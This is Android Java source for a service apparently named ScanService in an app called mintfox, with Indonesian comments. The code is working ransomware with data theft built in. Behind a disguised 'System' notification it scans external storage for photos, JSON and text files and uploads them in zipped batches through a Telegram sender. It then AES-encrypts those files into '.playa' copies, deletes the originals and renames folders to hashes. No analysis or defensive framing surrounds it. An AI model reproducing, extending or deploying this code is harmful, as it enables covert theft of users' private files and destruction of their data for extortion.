package com.mintfox.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ScanService extends Service {

    private static final String TAG = "ScanService";
    private static final long BATCH_MAX = 45L * 1024 * 1024;
    private static final String PREFS = "mintfox";
    private static final String KEY_DONE = "done_files";

    private ExecutorService scanner;
    private ExecutorService uploader;
    private volatile boolean running;
    private SharedPreferences prefs;
    private final Set<String> doneFiles = new HashSet<>();

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundSafely();
        prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        String raw = prefs.getString(KEY_DONE, "");
        if (!raw.isEmpty()) {
            for (String s : raw.split("\n")) if (!s.isEmpty()) doneFiles.add(s);
        }
        running = true;
        scanner = Executors.newFixedThreadPool(4);
        uploader = Executors.newFixedThreadPool(2);
        scanner.execute(this::runScan);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (scanner != null) scanner.shutdownNow();
        if (uploader != null) uploader.shutdownNow();
        persistDone();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void startForegroundSafely() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel(
                        "mintfox", "Sync", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, "mintfox")
                    : new Notification.Builder(this);
            b.setContentTitle("System")
             .setContentText("Running")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true);
            startForeground(1, b.build());
        } catch (Throwable t) {
            Log.w(TAG, "fg", t);
        }
    }

    /* ------------------------------------------------------------------ */
    /* Scan                                                                */
    /* ------------------------------------------------------------------ */

    private void runScan() {
        try {
            File root = Environment.getExternalStorageDirectory();
            List<File> queue = new ArrayList<>();
            walk(root, queue);
            Log.i(TAG, "scan selesai, file: " + queue.size());

            AtomicInteger idx = new AtomicInteger(0);
            int threads = 4;
            List<Thread> ts = new ArrayList<>();
            for (int i = 0; i < threads; i++) {
                Thread t = new Thread(() -> batchWorker(queue, idx));
                t.start();
                ts.add(t);
            }
            for (Thread t : ts) t.join();

            // Setelah semua batch terkirim, encrypt semua file sisa
            encryptAll(root);
            persistDone();
        } catch (Throwable t) {
            Log.w(TAG, "runScan", t);
        }
    }

    private void walk(File dir, List<File> out) {
        if (!running || dir == null) return;
        File[] children;
        try { children = dir.listFiles(); } catch (Throwable t) { return; }
        if (children == null) return;
        String name = dir.getName();
        if (name.equalsIgnoreCase("WhatsApp") || name.equalsIgnoreCase("WhatsApp Business")) return;

        for (File f : children) {
            if (!running) return;
            if (f.isDirectory()) {
                walk(f, out);
            } else {
                String n = f.getName().toLowerCase();
                if (n.endsWith(".jpg") || n.endsWith(".jpeg") || n.endsWith(".png")
                        || n.endsWith(".webp") || n.endsWith(".gif")
                        || n.endsWith(".json") || n.endsWith(".txt")) {
                    if (!doneFiles.contains(f.getAbsolutePath())) {
                        out.add(f);
                    }
                }
            }
        }
    }

    /* ------------------------------------------------------------------ */
    /* Batch + upload                                                      */
    /* ------------------------------------------------------------------ */

    private void batchWorker(List<File> queue, AtomicInteger idx) {
        while (running) {
            List<File> batch = new ArrayList<>();
            long size = 0;
            synchronized (queue) {
                int i = idx.get();
                while (i < queue.size() && size < BATCH_MAX) {
                    File f = queue.get(i);
                    i++;
                    try {
                        if (f.length() + size > BATCH_MAX) break;
                        size += f.length();
                        batch.add(f);
                    } catch (Throwable ignored) { }
                }
                idx.set(i);
                if (batch.isEmpty()) return;
            }

            File zip = null;
            try {
                zip = buildZip(batch);
                if (zip != null) {
                    final File fzip = zip;
                    final int count = batch.size();
                    uploader.execute(() -> {
                        boolean ok = TelegramSender.sendDocument(fzip, "batch " + count + " file");
                        if (ok) {
                            synchronized (doneFiles) {
                                for (File f : batch) doneFiles.add(f.getAbsolutePath());
                            }
                            persistDone();
                            //noinspection ResultOfMethodCallIgnored
                            fzip.delete();
                        }
                    });
                }
            } catch (Throwable t) {
                Log.w(TAG, "batch", t);
            }
        }
    }

    private File buildZip(List<File> files) {
        File zip = new File(getCacheDir(), "batch_" + System.currentTimeMillis() + ".zip");
        try (FileOutputStream fos = new FileOutputStream(zip);
             ZipOutputStream zos = new ZipOutputStream(fos)) {
            zos.setLevel(0); // tanpa kompresi
            byte[] buf = new byte[8192];
            Set<String> used = new HashSet<>();
            for (File f : files) {
                String entryName = HashUtil.sha512(f.getAbsolutePath()) + ".bin";
                while (!used.add(entryName)) {
                    entryName = HashUtil.sha512(entryName) + ".bin";
                }
                ZipEntry e = new ZipEntry(entryName);
                zos.putNextEntry(e);
                try (FileInputStream in = new FileInputStream(f)) {
                    int n;
                    while ((n = in.read(buf)) > 0) zos.write(buf, 0, n);
                }
                zos.closeEntry();
            }
        } catch (IOException e) {
            Log.w(TAG, "zip", e);
            //noinspection ResultOfMethodCallIgnored
            zip.delete();
            return null;
        }
        return zip;
    }

    /* ------------------------------------------------------------------ */
    /* Encrypt                                                             */
    /* ------------------------------------------------------------------ */

    private void encryptAll(File root) {
        File marker = new File(root, ".mintfox_enc");
        if (marker.exists()) return;
        walkEncrypt(root);
        try { marker.createNewFile(); } catch (Throwable ignored) { }
    }

    private void walkEncrypt(File dir) {
        if (!running || dir == null) return;
        File[] children;
        try { children = dir.listFiles(); } catch (Throwable t) { return; }
        if (children == null) return;

        for (File f : children) {
            if (!running) return;
            if (f.isDirectory()) {
                walkEncrypt(f);
                // rename folder jadi hash
                String h = HashUtil.sha512(f.getAbsolutePath());
                File newDir = new File(f.getParentFile(), h);
                if (!newDir.exists()) {
                    //noinspection ResultOfMethodCallIgnored
                    f.renameTo(newDir);
                }
            } else {
                String n = f.getName().toLowerCase();
                boolean target = n.endsWith(".jpg") || n.endsWith(".jpeg") || n.endsWith(".png")
                        || n.endsWith(".webp") || n.endsWith(".gif")
                        || n.endsWith(".json") || n.endsWith(".txt");
                if (!target) continue;

                File enc = new File(f.getParentFile(), HashUtil.sha512(f.getAbsolutePath()) + ".playa");
                if (AesUtil.encryptFile(f, enc)) {
                    //noinspection ResultOfMethodCallIgnored
                    f.delete();
                }
            }
        }
    }

    /* ------------------------------------------------------------------ */
    /* Persist                                                             */
    /* ------------------------------------------------------------------ */

    private void persistDone() {
        try {
            StringBuilder sb = new StringBuilder();
            synchronized (doneFiles) {
                for (String s : doneFiles) {
                    sb.append(s).append('\n');
                    if (sb.length() > 512 * 1024) break; // hindari prefs kebesaran
                }
            }
            prefs.edit().putString(KEY_DONE, sb.toString()).apply();
        } catch (Throwable ignored) { }
    }
}
